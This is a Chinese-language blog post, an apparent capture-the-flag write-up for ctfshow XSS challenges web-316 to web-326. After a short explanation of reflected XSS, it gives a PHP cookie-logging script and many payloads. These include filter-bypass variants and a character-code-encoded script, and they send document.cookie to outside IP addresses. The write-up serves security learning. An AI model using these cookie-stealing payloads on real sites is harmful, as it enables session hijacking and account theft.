@@ -1,0 +1,361 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="kinsey"><meta name="copyright" content="kinsey"><meta name="generator" content="Hexo 7.2.0"><meta name="theme" content="hexo-theme-yun"><title>ctfshow xss | 北歌</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
+  [".post-card",".markdown-body img"].forEach((target)=> {
+    ScrollReveal().reveal(target);
+  })
+}
+document.addEventListener("DOMContentLoaded", initScrollReveal);
+document.addEventListener("pjax:success", initScrollReveal);
+</script><link rel="stylesheet" type="text/css" href="https://fastly.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/katex.min.js"></script><link rel="stylesheet" type="text/css" href="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.css"><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><script defer src="https://fastly.jsdelivr.net/npm/katex@latest/dist/contrib/auto-render.min.js"></script><script type="module">import { renderKatex } from '/js/utils.js'
+document.addEventListener("DOMContentLoaded", () => {
+  renderKatex({
+    ...{},
+    ...undefined?.options,
+  });
+});</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#0078E7"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
+    window.Yun = {}
+    window.CONFIG = {"hostname":"kinsey973.github.io","root":"/","title":"北沐城歌","version":"1.10.11","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"algolia":{"appID":"LWKPDLFKV6","apiKey":"6f230e5e2cdf36415bd02b48c1138c08","indexName":"my-hexo-blog","hits":{"per_page":8}},"fireworks":{"colors":null},"waline":{"config":{"enable":true,"serverURL":"https://kinsey-six.vercel.app","comment":true,"visitor":true,"emoji":["https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/bilibili/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/weibo/","https://fastly.jsdelivr.net/gh/walinejs/emojis@latest/qq/"],"locale":{"placeholder":"填写邮箱，可以收到回复通知哦～"},"requiredMeta":["nick"],"el":"#waline","lang":"en"},"cdn":"https://fastly.jsdelivr.net/npm/@waline/client@v2/dist/waline.js","dark":"html.dark"},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
+  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="北歌" type="application/atom+xml"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+  gtag('config', 'G-1LL0D86CY9');
+}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
+  var bp = document.createElement('script');
+  var curProtocol = window.location.protocol.split(':')[0];
+  if (curProtocol === 'https') {
+    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else {
+    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(bp, s);
+})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><script>CONFIG.leancloudVisitors = {"enable":true,"app_id":"S8MhECl1Bg6fZt5ulKgIlajS-MdYXbMMI","app_key":"eLIsYKPJFnSJdwmHLoigqBR4","server_url":"https://s8mhecl1.api.lncldglobal.com"}</script><script defer src="/js/analytics/leancloud-visitors.js" type="module"></script><meta name="description" content="反射型(非持久化)（1）原理  反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。 （2）攻击方式  攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow xss">
+<meta property="og:url" content="https://kinsey973.github.io/2025/04/22/ctfshow-xss/index.html">
+<meta property="og:site_name" content="北歌">
+<meta property="og:description" content="反射型(非持久化)（1）原理  反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。 （2）攻击方式  攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504222107410.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504222141737.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232025106.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232025708.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232040763.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232040262.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232044662.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232047133.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232048170.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232053815.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232122756.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232126197.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504232151448.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504241947338.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504241956844.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504242140551.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504242148488.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281930240.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281931091.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281933114.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281938041.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281938930.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281942690.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281945387.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281947021.png">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504281948150.png">
+<meta property="article:published_time" content="2025-04-22T12:35:07.000Z">
+<meta property="article:modified_time" content="2025-05-19T11:02:25.285Z">
+<meta property="article:author" content="kinsey">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504222107410.png"><script>(function() {
+  if (CONFIG.mode !== 'auto') return
+  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
+  const setting = localStorage.getItem('darken-mode') || 'auto'
+  if (setting === 'dark' || (prefersDark && setting !== 'light'))
+    document.documentElement.classList.toggle('dark', true)
+})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
+IconifyProviders = {
+  // Empty prefix: overwrite default API provider configuration
+  '': {
+    // Use custom API first, use Iconify public API as backup
+    resources: [
+        'https://api.iconify.design',
+    ],
+    // Wait for 1 second before switching API hosts
+    rotate: 1000,
+  },
+};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="kinsey"><img width="96" loading="lazy" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202405312004243.jpeg" alt="kinsey"><span class="site-author-status" title="Looking for dawn.">🌑</span></a><div class="site-author-name"><a href="/about/">kinsey</a></div><span class="site-name">北歌</span><sub class="site-subtitle"></sub><div class="site-description"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">230</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">7</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">103</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="留言板"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:clipboard-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange"><span class="icon iconify" data-icon="ri:rss-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/kinsey973" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=3954596483" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://travellings.link" title="Travelling" target="_blank" style="color:var(--hty-text-color)"><span class="icon iconify" data-icon="ri:train-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a><a class="links-item hty-icon-button" href="/girls/" title="喜欢的女孩子" style="color:hotpink"><span class="icon iconify" data-icon="ri:women-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-%E9%9D%9E%E6%8C%81%E4%B9%85%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">反射型(非持久化)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-316"><span class="toc-number">2.</span> <span class="toc-text">web-316</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-317"><span class="toc-number">3.</span> <span class="toc-text">web-317</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-318"><span class="toc-number">4.</span> <span class="toc-text">web-318</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-319"><span class="toc-number">5.</span> <span class="toc-text">web-319</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-320"><span class="toc-number">6.</span> <span class="toc-text">web-320</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-321"><span class="toc-number">7.</span> <span class="toc-text">web-321</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-322"><span class="toc-number">8.</span> <span class="toc-text">web-322</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-323-326"><span class="toc-number">9.</span> <span class="toc-text">web 323-326</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E5%9E%8B-XSS"><span class="toc-number">10.</span> <span class="toc-text">存储型 XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM%E5%9E%8BXSS"><span class="toc-number">11.</span> <span class="toc-text">DOM型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-327"><span class="toc-number">12.</span> <span class="toc-text">web-327</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-328"><span class="toc-number">13.</span> <span class="toc-text">web-328</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-329"><span class="toc-number">14.</span> <span class="toc-text">web-329</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-330"><span class="toc-number">15.</span> <span class="toc-text">web-330</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-331"><span class="toc-number">16.</span> <span class="toc-text">web-331</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-332"><span class="toc-number">17.</span> <span class="toc-text">web-332</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web-333"><span class="toc-number">18.</span> <span class="toc-text">web-333</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="https://kinsey973.github.io/2025/04/22/ctfshow-xss/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="kinsey"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="北歌"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">ctfshow xss<a class="post-edit-link" href="https://github.com/kinsey973/kinsey973.github.io/tree/master/2024/05/31/hello-world_posts/ctfshow-xss.md" target="_blank" title="Edit this post" rel="noopener"><span class="icon iconify" data-icon="ri:edit-line"></span></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="Created: 2025-04-22 20:35:07" itemprop="dateCreated datePublished" datetime="2025-04-22T20:35:07+08:00">2025-04-22</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="Modified: 2025-05-19 19:02:25" itemprop="dateModified" datetime="2025-05-19T19:02:25+08:00">2025-05-19</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="Word count in article">5.5k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="Reading time">24m</span></span></span><span class="leancloud_visitors" id="/2025/04/22/ctfshow-xss/" data-flag-title="ctfshow xss"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Views"><span class="icon iconify" data-icon="ri:eye-line"></span> <span class="leancloud-visitors-count"></span></span></span><span class="post-meta-divider">-</span><a href="#comment"><span class="post-meta-item-icon" title="Comments"><span class="icon iconify" data-icon="ri:chat-3-line"></span> <span class="waline-comment-count" id="/2025/04/22/ctfshow-xss/"></span></span></a><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">学习笔记</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/xss/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">xss</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h3 id="反射型-非持久化"><a href="#反射型-非持久化" class="headerlink" title="反射型(非持久化)"></a>反射型(非持久化)</h3><p>（1）原理<br>  反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p>
+<p>（2）攻击方式<br>  攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞</p>
+<h3 id="web-316"><a href="#web-316" class="headerlink" title="web-316"></a>web-316</h3><p>反射型xss</p>
+<p>我们利用vps进行外带</p>
+<p>先往vps里写入一个1.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line">	<span class="variable">$time</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d h:i:s&#x27;</span>, <span class="title function_ invoke__">time</span>());</span><br><span class="line">	<span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>,<span class="variable">$time</span>.<span class="string">&#x27;:    &#x27;</span>. <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">	<span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>然后用js语句进行外带</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;location.href=&quot;http://60.204.158.87/123/2.php?cookie=&quot;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>此外，也可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.location.href=&#x27;http://60.204.158.87/123/2.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br><span class="line">&lt;input onfocus=&quot;window.open(&#x27;http://60.204.158.87/123/2.php?cookie=&#x27;+document.cookie)&quot; autofocus&gt;</span><br><span class="line">&lt;script&gt;window.open(&#x27;http://60.204.158.87/123/2.php?cookie=&#x27;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web-317"><a href="#web-317" class="headerlink" title="web-317"></a>web-317</h3><p>这题把script进行了过滤，我们使用img标签</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;&quot; οnerrοr=location.href=&quot;http://60.204.158.87/123/2.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web-318"><a href="#web-318" class="headerlink" title="web-318"></a>web-318</h3><p>我们试试script和img标签，都没有回显</p>
+<p>而我们输入<code>&lt;body&gt;alert(1)&lt;/body&gt;</code>有回显</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504222107410.png" alt="image-20250422210717305" loading="lazy"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;body οnlοad=location.href=&quot;http://60.204.158.87/123/2.php?cookie=&quot;+document.cookie&gt;</span><br><span class="line">&lt;body onload=&quot;document.location.href=&#x27;http://60.204.158.87/123/2.php?cookie=&#x27;+document.cookie&quot;&gt;&lt;/body&gt;</span><br><span class="line">&lt;body onload=&quot;document.location.href=&#x27;http://60.204.158.87/123/2.php?cookie=&#x27;+document.cookie&quot;&gt;</span><br><span class="line">&lt;iframe οnlοad=document.location=&#x27;http://60.204.158.87/123/2.php?cookie=&#x27;+document.cookie&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="web-319"><a href="#web-319" class="headerlink" title="web-319"></a>web-319</h3><p>同318</p>
+<h3 id="web-320"><a href="#web-320" class="headerlink" title="web-320"></a>web-320</h3><p>经过测试，他过滤了空格，script，img</p>
+<p>xss中空格可以用%09,&#x2F;**&#x2F;,&#x2F;,tab代替</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/**/οnlοad=location.href=&quot;http://60.204.158.87/123/2.php?cookie=&quot;+document.cookie&gt;</span><br></pre></td></tr></table></figure>
+
+<p>扩展：String.formCharCode函数</p>
+<p>他可以将ascii码转字符</p>
+<p>String.fromCharCode(111,110,108,111,97,100); 控制台运行结果如下：</p>
+<p><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202504222141737.png" alt="image-20250422214141614" loading="lazy"></p>
+<p>用它可以构造一个payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/**/οnlοad=document.write(String.fromCharCode(60,115,99,114,105,112,116,62,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,39,104,116,116,112,58,47,47,49,50,48,46,52,54,46,52,49,46,49,55,51,47,74,97,121,49,55,47,49,50,55,46,112,104,112,63,99,111,111,107,105,101,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,60,47,115,99,114,105,112,116,62));&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(***)`就是`&lt;script&gt;document.location.href=&#x27;http://120.46.41.173/Jay17/127.php?cookie=&#x27;+document.cookie&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>下面是字符串转ascii码脚本</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;请输入字符串: &quot;</span>)  <span class="comment"># 获取用户输入的字符串</span></span><br><span class="line">ascii_list = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历字符串，将每个字符转换为ASCII码，并添加到列表中</span></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> input_str:</span><br><span class="line">    ascii_code = <span class="built_in">ord</span>(char)  <span class="comment"># 使用ord()函数获取字符的ASCII码</span></span><br><span class="line">    ascii_list.append(<span class="built_in">str</span>(ascii_code))  <span class="comment"># 将ASCII码转换为字符串并添加到列表</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 将列表中的ASCII码用逗号隔开，并打印结果</span></span><br><span class="line">result = <span class="string">&#x27;,&#x27;</span>.join(ascii_list)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的ASCII码:&quot;</span>, result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>ascii转字符串</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ascii_to_string</span>(<span class="params">ascii_str</span>):</span><br><span class="line">    <span class="comment"># 将以逗号分隔的ASCII码字符串分割成一个列表</span></span><br><span class="line">    ascii_list = ascii_str.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用列表推导式将ASCII码转换为字符，并连接成一个字符串</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(code)) <span class="keyword">for</span> code <span class="keyword">in</span> ascii_list)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 输入以逗号分隔的ASCII码字符串</span></span><br><span class="line">ascii_str = <span class="built_in">input</span>(<span class="string">&quot;请输入以逗号分隔的ASCII码字符串: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用函数进行转换并打印结果</span></span><br><span class="line">string_result = ascii_to_string(ascii_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;转换后的字符串:&quot;</span>, string_result)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="web-321"><a href="#web-321" class="headerlink" title="web-321"></a>web-321</h3><p>同320</p>
+<h3 id="web-322"><a href="#web-322" class="headerlink" title="web-322"></a>web-322</h3><p>该题过滤了script，img，iframe，xss，空格，分号，逗号</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe/**/οnlοad=location.href=&quot;http://47.98.193.145/1111/127.php?cookie=&quot;+document.cookie&gt;&lt;/iframe&gt;</span><br><span class="line"></span><br><span class="line">&lt;svg/**/οnlοad=location.href=&quot;http://47.98.193.145/1111/127.php?cookie=&quot;+document.cookie&gt;</span><br><span class="line"></span><br><span class="line">&lt;body/οnlοad=location.href=&quot;http://47.98.193.145/1111/127.php?cookie=&quot;+document.cookie&gt;</span><br><span class="line"></span><br><span class="line">&lt;input/**/οnfοcus=location.href=&quot;http://47.98.193.145/1111/127.php?cookie=&quot;+document.cookie&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="web-323-326"><a href="#web-323-326" class="headerlink" title="web 323-326"></a>web 323-326</h3><p>同web322</p>
+<p>反射型到这一题应该就截止了，现在讲讲千奇百怪的payload。</p>
+<p>反射型绕过过滤好文：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/340080.html">xss 常用标签及绕过姿势总结 - FreeBuf网络安全行业门户</a></p>
